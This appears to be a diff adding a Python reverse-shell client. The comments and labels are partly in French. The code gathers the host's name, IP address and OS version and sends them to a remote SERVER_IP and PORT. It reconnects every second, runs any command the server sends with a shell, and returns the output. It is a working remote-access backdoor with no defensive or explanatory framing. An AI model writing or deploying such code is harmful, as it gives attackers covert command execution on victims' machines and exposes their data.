@@ -1,0 +1,47 @@
+def get_ip():
+    hostname = socket.gethostname()
+    ip_address = socket.gethostbyname(hostname)
+    os_name = platform.system()
+    os_version = platform.version()
+    port = str(PORT)
+    return f"========================================================================================================================\nHostname: {hostname}\n\nAdresse Ip: {ip_address}\n\nOs: {os_name}({os_version})\n\nPort: {port}\n ========================================================================================================================\n"
+
+#def get_hostname():
+#    hostName = socket.gethostname()
+#    return hostName
+
+while True:
+    try:
+        s = socket.socket()
+        s.connect((SERVER_IP, PORT))
+        s.send(get_ip().encode('utf-8'))
+        #s.send(get_hostname().encode())
+        #msg = s.recv(1024).decode()
+        #print('[*] Server:', msg)
+        while True:
+            cmd = s.recv(1024).decode()
+            if(cmd == "dir"):
+                os.system("dir >> dir.txt")
+                file = open("dir.txt", 'r')
+                contenu = file.read()
+                s.send(contenu.encode())
+            else:
+                if cmd.lower() in ['q', 'quit', 'exit', 'x']:
+                    break
+
+                try:
+                    result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
+                    s.send(result)
+                except Exception as e:
+                    result = str(e).encode()
+
+                if len(result) == 0:
+                    result = '[+] Executed Successfully'.encode()
+                    s.send(result)
+
+        s.close()
+        
+        time.sleep(1)
+
+    except Exception as e:
+        time.sleep(1)
